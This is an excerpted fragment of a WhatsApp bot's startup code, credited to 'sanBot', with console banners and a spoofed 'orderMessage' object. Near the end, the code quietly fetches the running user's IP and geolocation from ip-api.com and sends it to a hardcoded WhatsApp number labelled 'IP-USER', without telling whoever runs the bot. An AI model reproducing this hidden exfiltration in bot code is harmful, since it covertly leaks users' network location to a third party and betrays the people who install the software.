...
const starts = async (Ramdani = new WAConnection()) => {
	...
	console.log(color(`${spc2}           [ • CREATOR BY sanBot • ]` ,`${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : sanBot`, `${randomcolors}`))
...
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : sanBot`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : sanBot`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : sanBot`, `${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
...
const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6289512545999-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 sanBot 】`, orderTitle: 'sanBot', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
const spinner = { 
  "interval": 120,
  "frames": [
    "R",
    ...
    buttonMessagee = {
        contentText: `BOT TELAH AKTIF DI NOMOR INI by sanBot`,
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Ramdani.sendMessage("628975767944@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/628975767944?text=Assalamualaikum+bwang:v` } }})
